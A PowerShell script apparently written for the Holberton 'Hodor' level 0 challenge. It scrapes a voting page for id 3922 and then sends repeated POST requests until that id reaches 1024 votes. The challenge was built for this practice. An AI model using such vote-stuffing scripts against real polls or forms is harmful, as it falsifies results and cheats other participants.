#=======================================
#= 0. Level 0 - Holberton Hodor Project
#========================================

# ---------------------------------------
# script that votes 1024 times for your id
# here: http://158.69.76.135/level0.php.
# Using WebRequest session (POST).
#-----------------------------------------
function Get-Vote_Count{
    $progressPreference = 'silentlyContinue'
    $page = Invoke-WebRequest $url -Method 'Get' -Headers $headers
    $parse = $page -split 'tr'
    $match_key = $parse -match '3922'
    $match_key = $match_key -split '<td>'
    $match_key = $match_key -replace '\n', ''
    $match_key = $match_key -replace '</td>', ''
    $match_key = $match_key -replace '>', ''
    $match_key = $match_key -replace  '</'
    $match_key = $match_key -split '\n'
    return $match_key[2]
}


$url = "http://158.69.76.135/level0.php";

$sVoteData = @'
id=3922
holdthedoor=Submit
'@

$body = ConvertFrom-StringData -StringData $sVoteData
$headers = @{'Content-Type'= 'application/x-www-form-urlencoded';'ContentLength' = 64}

$total = Get-Vote_Count

if ($null -eq $total) {
    $total = 0;
}

for($i = [int]$total; $i -lt 1024; $i++){
    $progressPreference = 'silentlyContinue'
    $page = Invoke-WebRequest $url -Method 'Post' -Headers $headers -Body $body
    -join("sending vote ", ($i + 1), ": ")|Write-Host -NoNewline
    write-host $page.StatusDescription -ForegroundColor Green
}

$total = Get-Vote_Count
-join("Hodor Successful Cheat Voting, Total ", $total, ": ")|Write-Host
